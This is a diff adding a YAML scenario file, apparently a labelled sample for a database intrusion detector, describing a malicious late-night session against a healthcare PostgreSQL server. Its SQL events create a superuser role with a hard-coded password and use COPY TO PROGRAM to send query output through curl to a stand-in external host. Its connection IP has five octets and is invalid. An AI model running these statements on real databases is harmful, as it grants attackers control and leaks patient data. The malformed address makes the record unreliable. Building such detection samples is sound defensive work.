@@ -1,0 +1,23 @@
+scenario_id: gen_healthcare_27_data_tamper_mal_711
+family_id: gen_healthcare_27_data_tamper_mal_fam711
+domain: healthcare
+time_of_day: 03:20
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: postgres
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 1.0
+  events:
+  - step_id: act
+    sql: CREATE ROLE svc_270303 SUPERUSER LOGIN PASSWORD 'x172303'
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://warehouse-sync.datasink.example/ingest
+      -d @-'
+    connects_to:
+      ip: 23.129.64.47.130
+      port: 5432
